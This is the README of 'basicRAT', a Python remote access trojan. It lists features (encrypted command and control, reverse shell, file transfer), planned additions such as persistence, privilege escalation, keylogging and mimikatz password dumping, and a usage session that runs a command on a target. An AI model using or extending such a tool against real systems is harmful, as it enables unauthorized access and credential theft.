# basicRAT

This is a Python RAT (Remote Access Trojan). I created this to maintain a clean design Python RAT with standard features. Currently a work in progress and still being hacked on.

**Disclaimer: This RAT is for research purposes only, and should only be used on authorized systems. Accessing a computer system or network without authorization or explicit permission is illegal.**

## Features
* Cross-platform
* AES CBC Encrypted C2
* Reverse Shell
* File upload/download

## Todo
* Client binary generation tool (cross-platform)
  * Pyinstaller
  * Switch options for remote IP, port, crypto, key, protocol, etc
* Persistance (cross-platform)
  * Windows: Registry keys, WMIC, Startup Dir
  * Linux: Cron jobs, services, modprobe
* Additional Crypto
* Common C2 Protocols (HTTP, DNS)
* Privilege Escalation (getsystem-esque, dirty cow)
* Screenshot
* Keylogger
* Accept connection from multiple clients
* Toolkit (wget, unrar, unzip, )
* Scanning utility
* Password dumping (mimikatz / gsecdump)
* Tunneling

## Usage
```
$ python basicRAT_server.py --crypto AES --port 1337

  ____    ____  _____ ____   __  ____    ____  ______      .  ,
 |    \  /    |/ ___/|    | /  ]|    \  /    ||      |    (\;/)
 |  o  )|  o  (   \_  |  | /  / |  D  )|  o  ||      |   oo   \//,        _
 |     ||     |\__  | |  |/  /  |    / |     ||_|  |_| ,/_;~      \,     / '
 |  O  ||  _  |/  \ | |  /   \_ |    \ |  _  |  |  |   "'    (  (   \    !
 |     ||  |  |\    | |  \     ||  .  \|  |  |  |  |         //  \   |__.'
 |_____||__|__| \___||____\____||__|\_||__|__|  |__|       '~  '~----''
          https://github.com/vesche/basicRAT

basicRAT server listening on port 1337...

basicRAT> help

download <file> - Download a file.
help            - Show this help menu.
run <command>   - Execute a command on the target.
upload <file>   - Upload a file.
quit            - Gracefully kill client and server.

basicRAT> run uname -a
Linux sandbox3 4.7.6-1-ARCH #1 SMP PREEMPT Fri Sep 30 19:28:42 CEST 2016 x86_64 GNU/Linux
```

## Notes
* Binaries can created using [PyInstaller](http://www.pyinstaller.org/).
* Key was generated with `binascii.hexlify(os.urandom(16))`

## Other open-source Python RATs for Reference
* [ahhh/Reverse_DNS_Shell](https://github.com/ahhh/Reverse_DNS_Shell)
* [sweetsoftware/Ares](https://github.com/sweetsoftware/Ares)
